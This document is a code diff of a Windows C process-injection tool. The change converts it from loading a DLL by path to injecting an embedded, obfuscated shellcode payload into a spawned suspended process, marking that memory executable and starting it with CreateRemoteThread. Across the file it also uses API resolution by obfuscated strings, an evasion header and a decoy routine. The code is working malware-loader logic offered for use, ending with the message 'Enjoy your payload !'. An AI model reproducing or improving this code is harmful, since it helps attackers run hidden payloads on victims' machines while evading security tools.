@@ -1,27 +1,19 @@
 #include <windows.h>
 #include "detector.h"
 #include "evasion.h"
+#include "payload.h"
 
 // Core Injection Logic
-void StealthExec(HANDLE hProc, const char *dllN)
+void StealthExec(HANDLE hProc)
 {
     PVOID memLoc = NULL;
-    SIZE_T sz = strlen(dllN) + 1;
+    SIZE_T sz = payload_size + 1;
     HANDLE hThreadRemote;
     NTSTATUS status;
+    ULONG oldProtect;
 
-    // Resolve Required Functions
-    pMod pLLoad = GetMod(obfs_decode(144,"[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]LoadLibraryA"));
-
-    if (!pLLoad)
-    {
-        myDebug(DEBUG_ERROR, "Failed to resolve LoadLibraryA.");
-        return;
-    }
-    else
-    {
-        myDebug(DEBUG_SUCCESS, "Successfully resolve LoadLibraryA.");
-    }
+    // Decode the payload
+    obfs_decode_binary(DECKEY, payload, payload_size);
 
     status = CustAVM(hProc, &memLoc, 0, &sz, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
     if (status != 0)
@@ -41,7 +33,7 @@ void StealthExec(HANDLE hProc, const char *dllN)
     }
 
     // Write DLL Path to Remote Process
-    status = CustWVM(hProc, memLoc, (PVOID)dllN, (ULONG)sz, NULL);
+    status = CustWVM(hProc, memLoc, (PVOID)payload, (ULONG)sz, NULL);
     if (status != 0)
     {
         myDebug(DEBUG_ERROR, "Memory write failed (Err: 0x%lX).", status);
@@ -50,6 +42,18 @@ void StealthExec(HANDLE hProc, const char *dllN)
     else
     {
         myDebug(DEBUG_SUCCESS, "Successfully write memory.");
+    }
+    
+    // Change Page Protection   
+    status = CustPVM(hProc, &memLoc, &sz, PAGE_EXECUTE_READWRITE , &oldProtect);
+    if (status != 0)
+    {
+        myDebug(DEBUG_ERROR, "Protect Memory change failed (Err: 0x%lX).", status);
+        return;
+    }
+    else
+    {
+        myDebug(DEBUG_SUCCESS, "Successfully Protect Memory change.");
     }
 
     pMod pCRT = GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CreateRemoteThread"));
@@ -64,8 +68,7 @@ void StealthExec(HANDLE hProc, const char *dllN)
         myDebug(DEBUG_SUCCESS, "Successfully resolve CreateRemoteThread.");
     }
 
-    // Load Remote DLL
-    hThreadRemote = ((pCRT_t)pCRT)(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, 0, NULL);
+    hThreadRemote = ((pCRT_t)pCRT)(hProc, NULL, 0, memLoc, NULL, 0, NULL);
     if (!hThreadRemote)
     {
         myDebug(DEBUG_ERROR, "Thread creation failed.");
@@ -73,22 +76,15 @@ void StealthExec(HANDLE hProc, const char *dllN)
     }
     else
     {
-        myDebug(DEBUG_INFO, "Thread creation succeed. Waiting 5 sec for thread to resume");
+        myDebug(DEBUG_SUCCESS, "Thread creation succeed. Enjoy your payload !");
         pWaitForSingleObject_t pWaitForSingleObject = (pWaitForSingleObject_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]WaitForSingleObject"));
         DWORD waitResult = pWaitForSingleObject(hThreadRemote, (LPDWORD)5000); // Wait for 5 seconds
-        pCloseHandle_t pCloseHandle = (pCloseHandle_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CloseHandle"));
-        if ((waitResult == WAIT_TIMEOUT) || (waitResult == WAIT_FAILED))
+        while (((waitResult == WAIT_TIMEOUT) || (waitResult == WAIT_FAILED)))
         {
-            myDebug(DEBUG_ERROR, "WaitForSingleObject failed!");
-            pTerminateThread_t pTerminateThread = (pTerminateThread_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]TerminateThread"));
-            pTerminateThread(hThreadRemote, 0); // Kill stuck thread
-            pCloseHandle(hThreadRemote);
-            return;
+            waitResult = pWaitForSingleObject(hThreadRemote, (LPDWORD)5000); // we wait :)
         }
-        pResumeThread_t pResumeThread = (pResumeThread_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]ResumeThread"));
-        pResumeThread(hThreadRemote);
+        pCloseHandle_t pCloseHandle = (pCloseHandle_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CloseHandle"));
         pCloseHandle(hThreadRemote);
-        myDebug(DEBUG_SUCCESS, "Successfully injected module via RemoteThread");
     }
     return;
 }
@@ -102,15 +98,6 @@ int main(int argc, char *argv[])
         SortNumbers();
         return 0;
     }
-
-    // If no DLL given, abort.
-    if (argc != 2)
-    {
-        SortNumbers();
-        return 0;
-    }
-
-    const char *dllPath = argv[1];
 
     STARTUPINFOA sInfo = {0};
     PROCESS_INFORMATION pInfo = {0};
@@ -137,7 +124,7 @@ int main(int argc, char *argv[])
     myDebug(DEBUG_INFO, "Suspended %s created.", obfs_decode(DECKEY, procName));
 
     // Perform Injection
-    StealthExec(pInfo.hProcess, dllPath);
+    StealthExec(pInfo.hProcess);
 
     // Resume Execution
     pResumeThread_t pResumeThread = (pResumeThread_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]ResumeThread"));
@@ -145,7 +132,7 @@ int main(int argc, char *argv[])
     pCloseHandle_t pCloseHandle = (pCloseHandle_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CloseHandle"));
     pCloseHandle(pInfo.hProcess);
     pCloseHandle(pInfo.hThread);
-    myDebug(DEBUG_INFO, "%s is now running.", obfs_decode(DECKEY, procName));
+    myDebug(DEBUG_INFO, "%s has resumed normally.", obfs_decode(DECKEY, procName));
 
     return 0;
 }
